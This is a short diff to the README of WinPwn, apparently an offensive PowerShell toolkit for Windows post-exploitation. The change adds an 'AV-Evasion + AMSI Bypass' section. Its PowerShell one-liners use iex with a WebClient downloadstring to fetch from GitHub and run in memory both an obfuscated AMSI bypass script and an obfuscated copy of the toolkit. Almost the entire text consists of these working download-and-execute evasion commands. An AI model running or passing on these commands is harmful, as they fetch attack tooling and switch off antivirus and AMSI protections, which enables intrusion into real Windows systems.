@@ -10,7 +10,8 @@ Just Import the Modules with:
 `Import-Module .\WinPwn_v0.7.ps1` or 
 `iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1')`
 
-For AV-Evasion use:
+For AV-Evasion + AMSI Bypass use two commands:
+`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')`
 `iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`
 
 Functions available after Import:
